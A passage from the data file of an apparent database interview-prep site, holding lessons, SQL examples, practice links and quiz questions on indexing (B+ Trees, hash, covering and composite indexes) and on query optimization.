            {q: 'In the Wound-Wait deadlock prevention scheme:', o: ['Older transactions wait for younger ones', 'Younger transactions are always aborted immediately', 'Older transactions abort (wound) younger ones; younger transactions wait for older', 'All waiting transactions are periodically aborted'], a: 2},
            {q: 'Thomas\' Write Rule is an optimization for:', o: ['Lock-based protocols', 'Timestamp ordering protocol', 'MVCC', 'Optimistic concurrency control'], a: 1},
            {q: 'Which concurrency control mechanism allows readers to never block writers and vice versa?', o: ['Basic 2PL', 'Strict 2PL', 'MVCC', 'Timestamp ordering'], a: 2},
            {q: 'Intention locks (IS, IX, SIX) are used to:', o: ['Replace row-level locks entirely', 'Signal intent to acquire finer-grained locks at lower levels', 'Prevent all forms of deadlock', 'Implement MVCC snapshots'], a: 1}
          ]
        }
      ]
    },
    {
      id: 'idx', t: 'Indexing',
      topics: [
        {
          t: 'B-Tree, B+ Tree & Hash Indexing',
          learn: '<div class="learn-section"><div class="learn-h">Why This Matters</div><p class="learn-p">A query on a 100-million row trades table takes <b>30 seconds</b> without an index but only <b>3 milliseconds</b> with one. Understanding indexing internals &mdash; B-Trees, B+ Trees, hash indexes, covering indexes, and the leftmost prefix rule &mdash; is essential for database performance tuning and one of the most frequently tested topics in DBMS interviews. In production, the ability to design the right index can be the difference between a system that handles real-time trading loads and one that buckles under pressure.</p></div><div class="learn-section"><div class="learn-h">Why Indexing?</div><p class="learn-p">Without indexes, the DBMS must perform a <b>full table scan</b> to find matching rows — examining every row in the table. For a table with millions of rows, this is extremely slow. An <b>index</b> is a data structure that allows the DBMS to find rows efficiently, similar to a book\'s index.</p><p class="learn-p">Indexes are stored separately from the data and maintain pointers (row IDs or page addresses) to the actual data.</p></div><div class="learn-section"><div class="learn-h">B-Tree Index</div><p class="learn-p">A <b>B-Tree</b> (Balanced Tree) of order m has these properties:</p><ul class="learn-list"><li>Every node has at most <b>m</b> children</li><li>Every non-leaf node (except root) has at least <b>⌈m/2⌉</b> children</li><li>The root has at least 2 children (unless it\'s a leaf)</li><li>All leaves are at the <b>same level</b> (balanced)</li><li>A node with k children has k-1 keys</li><li><b>Both internal nodes and leaf nodes</b> store data pointers</li></ul><p class="learn-p">B-Trees keep the tree balanced, ensuring <span class="learn-complexity">O(log n)</span> search, insert, and delete operations.</p></div><div class="learn-section"><div class="learn-h">B+ Tree Index</div><p class="learn-p">The <b>B+ Tree</b> is the most widely used index structure in databases (MySQL InnoDB, PostgreSQL, Oracle, SQL Server). It differs from B-Tree in key ways:</p><table class="learn-table"><tr><th>Feature</th><th>B-Tree</th><th>B+ Tree</th></tr><tr><td>Data pointers</td><td>In both internal and leaf nodes</td><td>Only in leaf nodes</td></tr><tr><td>Leaf nodes linked?</td><td>No</td><td>Yes (doubly linked list)</td></tr><tr><td>Keys in internal nodes</td><td>Unique</td><td>Copies (also appear in leaves)</td></tr><tr><td>Range queries</td><td>Requires tree traversal</td><td>Sequential scan via leaf links</td></tr><tr><td>Fan-out</td><td>Lower (data pointers in internal nodes take space)</td><td>Higher (internal nodes only have keys)</td></tr></table><p class="learn-p"><b>Why B+ Tree is preferred over B-Tree in databases:</b></p><ol class="learn-list"><li><b>Higher fan-out</b> — Internal nodes store only keys (no data), so more keys fit per node, making the tree shorter and requiring fewer disk I/Os.</li><li><b>Efficient range queries</b> — Leaf nodes are linked, so scanning a range is a sequential traversal.</li><li><b>Predictable performance</b> — Every search goes to a leaf node, so the number of I/Os is always the height of the tree.</li></ol><div class="learn-code">-- B+ Tree index on salary (conceptual structure)\n-- Internal nodes: [50000 | 80000 | 110000]\n--                /      |       |        \\\n-- Leaves: [30K,40K,50K]->[60K,70K,80K]->[90K,100K,110K]->[120K]\n--         (linked list for range scans)</div><div class="learn-tip"><b>Tip:</b> For a B+ Tree of order p with n keys, the height is approximately <span class="learn-complexity">O(log_p n)</span>. With p=100 and n=1,000,000, the height is about 3 — meaning any record can be found in 3 disk reads!</div></div><div class="learn-section"><div class="learn-h">B+ Tree Insert &amp; Delete</div><p class="learn-p"><b>Insert algorithm:</b></p><ol class="learn-list"><li>Find the correct leaf node for the new key.</li><li>If the leaf has space, insert the key in sorted order.</li><li>If the leaf is full (<b>overflow</b>), <b>split</b> the leaf: move the upper half of keys to a new leaf, and <b>copy up</b> the middle key to the parent.</li><li>If the parent overflows, split it too and <b>push up</b> the middle key. Splits can cascade to the root.</li><li>If the root splits, create a new root — this is the only way the tree grows taller.</li></ol><div class="learn-code">Insert 25 into B+ Tree (order 4, max 3 keys per leaf):\n\nBefore: Root [20]\n         /        \\\\\n    [5,10,15] → [20,30,40]\n\nLeaf [20,30,40] is full → split at 30:\n    [20,25] and [30,40], copy 30 up to parent\n\nAfter:  Root [20, 30]\n         /     |      \\\\\n    [5,10,15] [20,25] [30,40]</div><p class="learn-p"><b>Delete algorithm:</b></p><ol class="learn-list"><li>Find and remove the key from the leaf.</li><li>If the leaf has fewer than <b>⌈(p-1)/2⌉</b> keys (<b>underflow</b>), try to <b>redistribute</b> (borrow a key from a sibling through the parent).</li><li>If redistribution is not possible (sibling at minimum), <b>merge</b> the leaf with a sibling and remove the separating key from the parent.</li><li>Merges can cascade upward. If the root is left empty, the tree shrinks.</li></ol><div class="learn-warn"><b>Interview tip:</b> Be prepared to walk through a B+ Tree insertion with splits on a whiteboard. Draw the tree before and after each step. Common follow-up: "What is the minimum number of keys in an internal node?" — Answer: ⌈m/2⌉ - 1 for order m.</div></div><div class="learn-section"><div class="learn-h">Clustered vs Non-Clustered Indexes</div><table class="learn-table"><tr><th>Aspect</th><th>Clustered Index</th><th>Non-Clustered Index</th></tr><tr><td>Data order</td><td>Data rows are physically sorted by the index key</td><td>Separate structure pointing to data</td></tr><tr><td>Number per table</td><td>Only 1 (data can only be sorted one way)</td><td>Multiple</td></tr><tr><td>Leaf nodes contain</td><td>Actual data rows</td><td>Pointers (row IDs) to data</td></tr><tr><td>Speed for range queries</td><td>Very fast (sequential disk reads)</td><td>Slower (may require random I/O)</td></tr><tr><td>Default in InnoDB</td><td>Primary key</td><td>All other indexes</td></tr></table><p class="learn-p">In InnoDB, the <b>primary key IS the clustered index</b>. The data is stored in the leaf nodes of the primary key B+ Tree. Secondary (non-clustered) indexes store the primary key value in their leaves, requiring a <b>secondary lookup</b> to fetch the actual row.</p></div><div class="learn-section"><div class="learn-h">Hash Indexing</div><p class="learn-p">A <b>hash index</b> uses a hash function to map search keys directly to bucket addresses. It provides <span class="learn-complexity">O(1)</span> average-case lookup for equality queries.</p><p class="learn-p"><b>Advantages</b>:</p><ul class="learn-list"><li>Very fast for <b>exact-match queries</b> (WHERE id = 42)</li><li>Simple implementation</li></ul><p class="learn-p"><b>Disadvantages</b>:</p><ul class="learn-list"><li><b>No range queries</b> — Hash does not maintain order, so WHERE salary &gt; 50000 cannot use a hash index</li><li><b>No ORDER BY</b> support</li><li><b>No prefix matching</b> — Cannot use for LIKE \'abc%\'</li><li><b>Hash collisions</b> — Can degrade performance</li><li><b>Resizing</b> — When the table grows, the hash table may need to be rebuilt</li></ul><div class="learn-code">-- MySQL: MEMORY engine supports hash indexes\nCREATE TABLE Cache (\n    key_col VARCHAR(100),\n    value   TEXT,\n    INDEX USING HASH (key_col)\n) ENGINE = MEMORY;\n\n-- PostgreSQL: hash index\nCREATE INDEX idx_hash ON table_name USING HASH (column_name);</div><div class="learn-warn"><b>Warning:</b> In MySQL InnoDB, you cannot explicitly create a hash index on disk tables. InnoDB\'s Adaptive Hash Index is an internal optimization that automatically creates in-memory hash indexes for frequently accessed B+ Tree pages.</div></div><div class="learn-section"><div class="learn-h">Dense vs Sparse Indexes</div><p class="learn-p"><b>Dense index</b>: An index entry for <b>every</b> record in the data file. Allows direct lookup of any record.</p><p class="learn-p"><b>Sparse index</b>: An index entry for only <b>some</b> records (e.g., one per disk block). Requires the data to be sorted on the search key. Uses fewer index entries but requires sequential search within a block.</p><p class="learn-p">A <b>clustered index can be sparse</b> (data is sorted). A <b>non-clustered index must be dense</b> (data is not sorted by the index key).</p></div><div class="learn-section"><div class="learn-h">Multi-Level Indexing</div><p class="learn-p">When an index itself is too large to fit in memory, we can create an <b>index on the index</b> — a multi-level index. The B+ Tree is inherently a multi-level index structure. The internal nodes form upper-level indexes, and the leaf nodes form the lowest-level index pointing to data.</p></div><div class="learn-section"><div class="learn-h">Covering Indexes</div><p class="learn-p">A <b>covering index</b> includes all columns needed by a query in the index itself. The query can be answered entirely from the index without accessing the base table — this is called an <b>index-only scan</b>.</p><div class="learn-code">-- Query: SELECT name, salary FROM employees WHERE dept_id = 5\n\n-- Non-covering index (requires table lookup):\nCREATE INDEX idx_dept ON employees(dept_id);\n-- 1. Find rows with dept_id=5 in index → get row pointers\n-- 2. Go to table to read name, salary (random I/O!)\n\n-- Covering index (no table access needed):\nCREATE INDEX idx_dept_cover ON employees(dept_id, name, salary);\n-- EXPLAIN shows "Using index" — all data in the index leaf nodes</div><p class="learn-p"><b>Why covering indexes are fast:</b></p><ul class="learn-list"><li>Avoids secondary lookup to base table (saves random I/O)</li><li>Index is smaller than the table — more fits in memory</li><li>Especially impactful in InnoDB where secondary indexes need a primary key lookup to get the full row</li></ul><p class="learn-p"><b>INCLUDE columns</b> (PostgreSQL, SQL Server): Add non-key columns to the index leaf pages without affecting the tree structure:</p><div class="learn-code">-- Only dept_id is searchable; name, salary are just stored in leaves\nCREATE INDEX idx_dept_incl ON employees(dept_id) INCLUDE (name, salary);\n-- Smaller index tree, but still covers the query</div><div class="learn-warn"><b>Trade-off:</b> Covering indexes increase write overhead (every INSERT/UPDATE updates the wider index) and use more storage. Use them for frequently run queries on read-heavy tables, not as a default for every query.</div></div><div class="learn-section"><div class="learn-h">Composite Index &amp; Leftmost Prefix Rule</div><p class="learn-p">A <b>composite index</b> on columns (A, B, C) can satisfy queries on:</p><ul class="learn-list"><li>A alone ✓</li><li>A, B ✓</li><li>A, B, C ✓</li><li>B alone ✗ (cannot skip leftmost column)</li><li>A, C ✗ partially (uses A, scans for C)</li></ul><div class="learn-code">CREATE INDEX idx_abc ON orders(customer_id, order_date, amount);\n\n-- Uses index fully:\nWHERE customer_id = 5 AND order_date = \'2024-01-01\'\n\n-- Uses index partially (only customer_id):\nWHERE customer_id = 5 AND amount &gt; 100\n\n-- Cannot use this index:\nWHERE order_date = \'2024-01-01\'  -- leftmost column missing</div><div class="learn-tip"><b>Interview tip:</b> When asked "how would you optimize this query?", always check: (1) Is there an index on the WHERE columns? (2) Does the index cover the SELECT columns? (3) Does the column order follow the leftmost prefix rule? These three checks solve most indexing interview questions.</div></div><div class="learn-section"><div class="learn-h">Interview Spotlight</div><p class="learn-p"><b>Q1: Why is B+ Tree preferred over B-Tree for database indexing?</b><br>A: B+ Trees have higher fan-out because internal nodes store only keys (no data pointers), making the tree shorter and reducing disk I/Os. Leaf nodes are linked in a doubly linked list, enabling efficient range scans. Every lookup traverses to a leaf, providing predictable I/O cost.</p><p class="learn-p"><b>Q2: What is the difference between a clustered and a non-clustered index?</b><br>A: A clustered index determines the physical storage order of data rows &mdash; there can be only one per table. A non-clustered index is a separate structure with pointers back to the data rows, and you can have many. In InnoDB, the primary key is the clustered index, and secondary indexes store the primary key value in their leaves, requiring an extra lookup to fetch the full row.</p><p class="learn-p"><b>Q3: What is a covering index and why is it beneficial?</b><br>A: A covering index includes all columns needed by a query in the index itself. The DBMS can satisfy the query entirely from the index without accessing the base table (an index-only scan), eliminating costly random I/O to the data pages.</p><p class="learn-p"><b>Q4: Explain the leftmost prefix rule for composite indexes.</b><br>A: A composite index on (A, B, C) can be used for queries filtering on A, or A and B, or A, B, and C &mdash; but not B alone or C alone. The index entries are sorted first by A, then by B within A, then by C within (A, B). Skipping the leftmost column means the sort order cannot be exploited.</p><p class="learn-p"><b>Q5: When would you NOT create an index?</b><br>A: Avoid indexes on: (1) small tables where a full scan is faster, (2) columns with very low cardinality (e.g., a boolean column), (3) write-heavy tables where index maintenance overhead outweighs read benefits, (4) columns rarely used in WHERE/JOIN/ORDER BY clauses, and (5) wide indexes that consume excessive storage.</p><p class="learn-p"><b>Q6: How does InnoDB handle secondary indexes differently from MyISAM?</b><br>A: InnoDB secondary indexes store the primary key value in their leaf nodes, so a secondary index lookup requires two B+ Tree traversals: first the secondary index to find the primary key, then the primary key (clustered) index to fetch the row. MyISAM stores direct row pointers, requiring only one lookup but losing the data-locality benefits of clustered storage.</p><p class="learn-p"><b>Q7: What is the difference between a dense and a sparse index?</b><br>A: A dense index has an entry for every record in the data file &mdash; any record can be found directly. A sparse index has entries for only some records (e.g., one per disk block) and requires the data to be sorted on the search key. Sparse indexes are smaller but need sequential search within a block. Clustered indexes can be sparse; non-clustered indexes must be dense.</p></div>',
          code: `-- =============================================
-- B-Tree, B+ Tree & Hash Indexing
-- =============================================

-- ===== CREATING INDEXES =====

-- Default B+ Tree index (most common)
CREATE INDEX idx_salary ON Employees(salary);

-- Unique index (also used for UNIQUE constraints)
CREATE UNIQUE INDEX idx_email ON Employees(email);

-- Composite index
CREATE INDEX idx_dept_salary ON Employees(dept_id, salary);
-- Useful for: WHERE dept_id = 10 AND salary > 50000
-- Also useful for: WHERE dept_id = 10 (leftmost prefix)
-- NOT useful for: WHERE salary > 50000 (not leftmost)

-- Covering index (includes all columns needed by query)
CREATE INDEX idx_covering ON Employees(dept_id, salary, name);
-- SELECT name, salary FROM Employees WHERE dept_id = 10
-- This query can be answered entirely from the index (no table lookup)

-- ===== INDEX USAGE ANALYSIS =====

-- Check if a query uses an index
EXPLAIN SELECT * FROM Employees WHERE salary > 90000;
-- Look for: type=range, key=idx_salary

EXPLAIN SELECT * FROM Employees WHERE dept_id = 10 AND salary > 50000;
-- Should use idx_dept_salary

-- Queries that CANNOT use idx_dept_salary efficiently:
EXPLAIN SELECT * FROM Employees WHERE salary > 50000;
-- Full table scan or uses a different index

-- ===== HASH INDEX (Memory Engine) =====
CREATE TABLE SessionCache (
    session_id VARCHAR(64) PRIMARY KEY,
    user_id    INT,
    data       TEXT,
    INDEX USING HASH (session_id)
) ENGINE = MEMORY;

-- Fast exact lookup (uses hash):
SELECT * FROM SessionCache WHERE session_id = 'abc123';

-- Cannot use hash for range:
-- SELECT * FROM SessionCache WHERE session_id > 'abc';
-- This would require a full scan

-- ===== B+ TREE HEIGHT CALCULATION =====
-- Given:
--   Block size = 4096 bytes
--   Key size = 8 bytes (INT)
--   Pointer size = 8 bytes
--   Record pointer = 8 bytes
--
-- Internal node: keys and child pointers
--   p * 8 + (p-1) * 8 <= 4096
--   16p - 8 <= 4096 => p = 256 (fan-out)
--
-- Leaf node: keys and record pointers
--   n * (8 + 8) + 8 (next leaf pointer) <= 4096
--   16n <= 4088 => n = 255 records per leaf
--
-- For 1,000,000 records:
--   Leaf nodes = ceil(1000000 / 255) = 3922
--   Level 1 internal = ceil(3922 / 256) = 16
--   Level 2 internal = ceil(16 / 256) = 1 (root)
--   Height = 3 levels => 3 disk reads for any lookup!

-- ===== INDEX MAINTENANCE CONSIDERATIONS =====

-- Check index statistics
SHOW INDEX FROM Employees;

-- Analyze table to update index statistics
ANALYZE TABLE Employees;

-- Rebuild indexes (useful after many deletes)
ALTER TABLE Employees ENGINE=InnoDB;  -- MySQL: rebuild all indexes

-- Drop unused indexes (they slow down writes)
DROP INDEX idx_salary ON Employees;

-- ===== PARTIAL INDEX (PostgreSQL only) =====
-- CREATE INDEX idx_active ON Employees(name) WHERE status = 'active';
-- Only indexes active employees; smaller and faster

-- ===== EXPRESSION INDEX (PostgreSQL) =====
-- CREATE INDEX idx_lower_email ON Employees(LOWER(email));
-- Useful for case-insensitive searches`,
          problems: [
            ['B+ Tree Concepts', 'https://www.geeksforgeeks.org/introduction-of-b-tree/', 'Medium'],
            ['Indexing in DBMS', 'https://www.geeksforgeeks.org/indexing-in-databases-set-1/', 'Easy'],
            ['B+ Tree Insertion', 'https://www.geeksforgeeks.org/insertion-in-a-b-tree/', 'Hard'],
            ['Clustered vs Non-Clustered Indexes', 'https://www.geeksforgeeks.org/difference-between-clustered-and-non-clustered-index/', 'Easy'],
            ['Composite Index Design', 'https://www.geeksforgeeks.org/composite-key-in-sql/', 'Medium']
          ],
          mcqs: [
            {q: 'Why is B+ Tree preferred over B-Tree for database indexing?', o: ['B+ Tree is simpler to implement', 'B+ Tree has higher fan-out and supports efficient range queries via linked leaves', 'B+ Tree uses less storage', 'B-Tree cannot handle deletions'], a: 1},
            {q: 'A hash index is best suited for:', o: ['Range queries (WHERE salary > 50000)', 'ORDER BY operations', 'Exact equality lookups (WHERE id = 42)', 'LIKE pattern matching'], a: 2},
            {q: 'How many clustered indexes can a table have?', o: ['As many as needed', 'Exactly one', 'Exactly two', 'None — clustered indexes don\'t exist'], a: 1},
            {q: 'What is a covering index?', o: ['An index that spans multiple tables', 'An index that includes all columns needed by a query so the base table need not be accessed', 'An index that covers NULL values', 'An index on a computed column'], a: 1},
            {q: 'In InnoDB, what do secondary (non-clustered) index leaf nodes store?', o: ['Direct pointers to data rows on disk', 'The primary key value of the matching row', 'The entire data row', 'A hash of the row address'], a: 1},
            {q: 'Which statement about the leftmost prefix rule is correct?', o: ['A composite index on (A,B,C) can be used for queries filtering only on B', 'A composite index on (A,B,C) can be used for queries filtering only on C', 'A composite index on (A,B,C) can be used for queries filtering only on A', 'Column order in a composite index does not matter'], a: 2},
            {q: 'A sparse index requires that:', o: ['Every record has an index entry', 'The data file is sorted on the search key', 'The index uses a hash function', 'The table has no primary key'], a: 1}
          ]
        }
      ]
    },
    {
      id: 'qopt', t: 'Query Optimization',
      topics: [
        {
          t: 'Query Processing & Optimization',
          learn: '<div class="learn-section"><div class="learn-h">Why This Matters</div><p class="learn-p">Your reporting query joins 5 tables and takes 45 seconds. Understanding how the query optimizer works &mdash; from parsing and plan generation to cost estimation and join algorithm selection &mdash; lets you rewrite it to run in under 1 second. Query optimization directly impacts trading system latency: a poorly optimized query on a positions table can mean the difference between acting on a market opportunity and missing it entirely. Interviewers frequently ask candidates to analyze EXPLAIN plans and identify performance bottlenecks.</p></div><div class="learn-section"><div class="learn-h">Query Processing Overview</div><p class="learn-p">When a SQL query is submitted, the DBMS processes it through several stages before returning results:</p><ol class="learn-list"><li><b>Parsing</b> — Check syntax, validate table/column names, resolve aliases</li><li><b>Translation</b> — Convert SQL to an internal representation (relational algebra expression)</li><li><b>Optimization</b> — Generate multiple equivalent query plans and choose the cheapest one</li><li><b>Execution</b> — Execute the chosen plan and return results</li></ol><p class="learn-p">The <b>query optimizer</b> is the most critical component. It determines <i>how</i> to execute the query — which indexes to use, which join algorithm, what order to join tables, etc.</p></div><div class="learn-section"><div class="learn-h">Relational Algebra Equivalence Rules</div><p class="learn-p">The optimizer uses <b>equivalence rules</b> to transform a query into equivalent but more efficient forms:</p><ul class="learn-list"><li><b>Selection pushdown</b>: σ(R ⋈ S) → σ(R) ⋈ S — Apply WHERE filters as early as possible to reduce intermediate result sizes</li><li><b>Projection pushdown</b>: π(R ⋈ S) → π(π(R) ⋈ π(S)) — Project out unnecessary columns early</li><li><b>Join commutativity</b>: R ⋈ S = S ⋈ R</li><li><b>Join associativity</b>: (R ⋈ S) ⋈ T = R ⋈ (S ⋈ T)</li><li><b>Selection cascade</b>: σ_{a AND b}(R) = σ_a(σ_b(R))</li></ul><div class="learn-tip"><b>Tip:</b> The most impactful optimization is <b>selection pushdown</b> — filtering rows early dramatically reduces the amount of data processed in subsequent operations.</div></div><div class="learn-section"><div class="learn-h">Cost-Based Optimization</div><p class="learn-p">The optimizer estimates the <b>cost</b> of each plan based on:</p><ul class="learn-list"><li><b>Disk I/O</b> — Number of disk block reads/writes (dominant factor)</li><li><b>CPU cost</b> — Computation for comparisons, hashing, sorting</li><li><b>Memory</b> — Buffer pool usage</li><li><b>Network</b> — For distributed queries</li></ul><p class="learn-p">To estimate costs, the optimizer uses <b>statistics</b> maintained by the DBMS:</p><table class="learn-table"><tr><th>Statistic</th><th>Description</th></tr><tr><td>n_r</td><td>Number of tuples (rows) in relation r</td></tr><tr><td>b_r</td><td>Number of disk blocks for relation r</td></tr><tr><td>l_r</td><td>Size of a tuple in bytes</td></tr><tr><td>V(A, r)</td><td>Number of distinct values of attribute A in r</td></tr><tr><td>f_r</td><td>Blocking factor (tuples per block)</td></tr></table><div class="learn-code">-- Update statistics in MySQL\nANALYZE TABLE Employees;\n\n-- View statistics\nSHOW TABLE STATUS LIKE \'Employees\';\n\n-- In PostgreSQL:\n-- ANALYZE employees;\n-- SELECT * FROM pg_stats WHERE tablename = \'employees\';</div></div><div class="learn-section"><div class="learn-h">Join Algorithms</div><p class="learn-p">The optimizer chooses the best join algorithm based on table sizes, available indexes, and memory:</p><table class="learn-table"><tr><th>Algorithm</th><th>Cost</th><th>Best When</th></tr><tr><td>Nested Loop Join</td><td><span class="learn-complexity">O(m * n)</span> blocks</td><td>Inner table is small or has an index</td></tr><tr><td>Block Nested Loop</td><td><span class="learn-complexity">O(m * n / B)</span> where B = buffer size</td><td>No useful index, limited memory</td></tr><tr><td>Index Nested Loop</td><td><span class="learn-complexity">O(m * log n)</span></td><td>Inner table has index on join column</td></tr><tr><td>Sort-Merge Join</td><td><span class="learn-complexity">O(m log m + n log n)</span></td><td>Both tables large, data already sorted or can be sorted</td></tr><tr><td>Hash Join</td><td><span class="learn-complexity">O(m + n)</span></td><td>Equi-join, no index, enough memory for hash table</td></tr></table></div><div class="learn-section"><div class="learn-h">EXPLAIN and Query Plans</div><p class="learn-p">Use <b>EXPLAIN</b> to see the query execution plan chosen by the optimizer:</p><div class="learn-code">EXPLAIN SELECT e.name, d.dept_name\nFROM Employees e\nJOIN Departments d ON e.dept_id = d.dept_id\nWHERE e.salary &gt; 80000;</div><p class="learn-p">Key columns in MySQL EXPLAIN output:</p><table class="learn-table"><tr><th>Column</th><th>Meaning</th></tr><tr><td>type</td><td>Access type: ALL (full scan), index, range, ref, eq_ref, const</td></tr><tr><td>key</td><td>Index used (NULL = no index)</td></tr><tr><td>rows</td><td>Estimated rows examined</td></tr><tr><td>Extra</td><td>Additional info: Using index, Using filesort, Using temporary</td></tr></table><p class="learn-p"><b>Access types</b> from best to worst: <code>const</code> &gt; <code>eq_ref</code> &gt; <code>ref</code> &gt; <code>range</code> &gt; <code>index</code> &gt; <code>ALL</code></p></div><div class="learn-section"><div class="learn-h">Query Optimization Tips for Interviews</div><ol class="learn-list"><li><b>Use indexes wisely</b> — Create indexes on columns used in WHERE, JOIN, ORDER BY</li><li><b>Avoid SELECT *</b> — Only select needed columns; allows covering index usage</li><li><b>Avoid functions on indexed columns</b> — <code>WHERE YEAR(date_col) = 2024</code> cannot use an index; use <code>WHERE date_col BETWEEN \'2024-01-01\' AND \'2024-12-31\'</code></li><li><b>Use EXISTS over IN</b> for correlated checks (EXISTS short-circuits)</li><li><b>Avoid OR on different columns</b> — <code>WHERE a=1 OR b=2</code> may not use indexes; rewrite as UNION</li><li><b>Limit result sets</b> — Use LIMIT for pagination; avoid fetching all rows</li><li><b>Denormalize for read-heavy queries</b> — Reduce JOINs where appropriate</li></ol><div class="learn-warn"><b>Warning:</b> Adding too many indexes hurts write performance. Every INSERT, UPDATE, and DELETE must also update all indexes. Finding the right balance is key.</div></div><div class="learn-section"><div class="learn-h">Interview Spotlight</div><p class="learn-p"><b>Q1: What does the EXPLAIN statement show and how do you use it?</b><br>A: EXPLAIN shows the query execution plan chosen by the optimizer &mdash; which tables are accessed, in what order, using which indexes, and the estimated number of rows examined. Key columns include <code>type</code> (access method: ALL, index, range, ref, eq_ref, const), <code>key</code> (index used), <code>rows</code> (estimated rows scanned), and <code>Extra</code> (e.g., Using index, Using filesort). Use it to identify full table scans, missing indexes, and unnecessary sorts.</p><p class="learn-p"><b>Q2: How do you optimize a slow query step by step?</b><br>A: (1) Run EXPLAIN to see the current plan. (2) Look for ALL access type or large row counts. (3) Add indexes on WHERE, JOIN, and ORDER BY columns. (4) Check for functions on indexed columns that prevent index usage. (5) Rewrite subqueries as JOINs where beneficial. (6) Use covering indexes to avoid table lookups. (7) Consider keyset pagination instead of large OFFSET values.</p><p class="learn-p"><b>Q3: Why is selection pushdown the most impactful optimization?</b><br>A: Selection pushdown applies WHERE filters as early as possible in the query plan, dramatically reducing the number of rows that flow through subsequent operations like joins and sorts. Filtering a million-row table down to 100 rows before a join is far cheaper than joining all million rows and filtering afterward.</p><p class="learn-p"><b>Q4: Compare hash join, sort-merge join, and nested loop join.</b><br>A: Nested loop join (<span class="learn-complexity">O(m*n)</span>) iterates over each row of the outer table and scans the inner table &mdash; best when the inner table is small or has an index. Sort-merge join (<span class="learn-complexity">O(m log m + n log n)</span>) sorts both tables then merges &mdash; best when data is already sorted or both tables are large. Hash join (<span class="learn-complexity">O(m+n)</span>) builds a hash table on the smaller relation &mdash; best for equi-joins with no index and sufficient memory.</p><p class="learn-p"><b>Q5: Why does applying a function on an indexed column prevent index usage?</b><br>A: The B+ Tree index stores original column values in sorted order. When you apply a function (e.g., <code>WHERE YEAR(date_col) = 2024</code>), the DBMS cannot navigate the tree because it would need to compute the function on every stored value. Instead, rewrite as a range condition: <code>WHERE date_col &gt;= \'2024-01-01\' AND date_col &lt; \'2025-01-01\'</code>.</p><p class="learn-p"><b>Q6: What is keyset pagination and why is it better than OFFSET?</b><br>A: OFFSET-based pagination (<code>LIMIT 10 OFFSET 100000</code>) forces the database to scan and discard 100,000 rows before returning results. Keyset pagination uses the last seen value as a starting point (<code>WHERE id &gt; 100000 ORDER BY id LIMIT 10</code>), directly seeking to the correct position via the index. This provides consistent O(log n) performance regardless of how deep into the result set you paginate.</p><p class="learn-p"><b>Q7: When should you use EXISTS instead of IN for subqueries?</b><br>A: EXISTS is generally more efficient for correlated subqueries because it short-circuits &mdash; it stops as soon as a matching row is found. IN materializes the full result of the subquery first. However, modern optimizers often transform between the two. EXISTS is preferred when the subquery could return many rows and you only need to know if at least one match exists.</p></div>',
          code: `-- =============================================
-- Query Processing & Optimization
-- =============================================

-- ===== EXPLAIN: Analyzing Query Plans =====

-- Full table scan (no index on dept)
EXPLAIN SELECT * FROM Employees WHERE dept = 'Engineering';
-- type: ALL, key: NULL => needs index

-- After adding index:
CREATE INDEX idx_dept ON Employees(dept);
EXPLAIN SELECT * FROM Employees WHERE dept = 'Engineering';
-- type: ref, key: idx_dept => uses index

-- Range scan
EXPLAIN SELECT * FROM Employees WHERE salary BETWEEN 80000 AND 100000;
-- type: range (if index on salary exists)

-- Index-only scan (covering index)
CREATE INDEX idx_dept_sal_name ON Employees(dept, salary, name);
EXPLAIN SELECT name, salary FROM Employees WHERE dept = 'Engineering';
-- Extra: Using index (no table lookup needed)

-- ===== OPTIMIZATION TECHNIQUES =====

-- BAD: Function on indexed column prevents index usage
SELECT * FROM Employees WHERE YEAR(hire_date) = 2024;
-- GOOD: Range condition uses index
SELECT * FROM Employees
WHERE hire_date >= '2024-01-01' AND hire_date < '2025-01-01';

-- BAD: SELECT * fetches unnecessary columns
SELECT * FROM Employees WHERE dept_id = 10;
-- GOOD: Select only needed columns (may use covering index)
SELECT name, salary FROM Employees WHERE dept_id = 10;

-- BAD: OR on different columns (may not use index)
SELECT * FROM Employees WHERE dept_id = 10 OR salary > 100000;
-- GOOD: Rewrite as UNION
SELECT * FROM Employees WHERE dept_id = 10
UNION
SELECT * FROM Employees WHERE salary > 100000;

-- BAD: Leading wildcard prevents index usage
SELECT * FROM Employees WHERE name LIKE '%alice%';
-- GOOD: No leading wildcard
SELECT * FROM Employees WHERE name LIKE 'Alice%';

-- BAD: Implicit type conversion
SELECT * FROM Employees WHERE emp_id = '42';  -- emp_id is INT
-- GOOD: Match types
SELECT * FROM Employees WHERE emp_id = 42;

-- ===== JOIN ORDER OPTIMIZATION =====

-- The optimizer chooses join order, but you can hint:
-- MySQL: STRAIGHT_JOIN forces left-to-right order
SELECT STRAIGHT_JOIN e.name, d.dept_name
FROM Employees e
STRAIGHT_JOIN Departments d ON e.dept_id = d.dept_id;

-- ===== SUBQUERY vs JOIN performance =====

-- Subquery (may be slower — executed per row):
SELECT name FROM Employees
WHERE dept_id IN (SELECT dept_id FROM Departments WHERE location = 'NYC');

-- Equivalent JOIN (often faster):
SELECT e.name FROM Employees e
JOIN Departments d ON e.dept_id = d.dept_id
WHERE d.location = 'NYC';

-- ===== PAGINATION OPTIMIZATION =====

-- BAD: Large OFFSET scans and discards rows
SELECT * FROM Employees ORDER BY emp_id LIMIT 10 OFFSET 100000;

-- GOOD: Keyset pagination (seek method)
SELECT * FROM Employees
WHERE emp_id > 100000
ORDER BY emp_id LIMIT 10;

-- ===== ANALYZING INDEX USAGE =====

-- Show all indexes on a table
SHOW INDEX FROM Employees;

-- Find unused indexes (MySQL performance_schema)
SELECT * FROM performance_schema.table_io_waits_summary_by_index_usage
WHERE object_schema = 'mydb' AND index_name IS NOT NULL
AND count_read = 0;

-- ===== QUERY PROFILING =====
SET profiling = 1;
SELECT * FROM Employees WHERE salary > 90000;
SHOW PROFILES;
SHOW PROFILE FOR QUERY 1;`,
          problems: [
            ['Query Optimization Basics', 'https://www.geeksforgeeks.org/query-optimization-in-relational-algebra/', 'Medium'],
            ['Join Algorithms', 'https://www.geeksforgeeks.org/join-algorithms-in-database/', 'Hard']
          ],
          mcqs: [
            {q: 'Which optimization has the most impact on query performance?', o: ['Projection pushdown', 'Selection pushdown (pushing WHERE filters early)', 'Join commutativity', 'Using DISTINCT'], a: 1},
            {q: 'In EXPLAIN output, which access type is the most efficient?', o: ['ALL', 'range', 'const', 'index'], a: 2},
            {q: 'Why does WHERE YEAR(date_col) = 2024 not use an index on date_col?', o: ['YEAR() is not a valid SQL function', 'The index only works for exact matches', 'Applying a function to the column prevents index lookup — the DBMS cannot search the B+ tree', 'It does use the index efficiently'], a: 2},
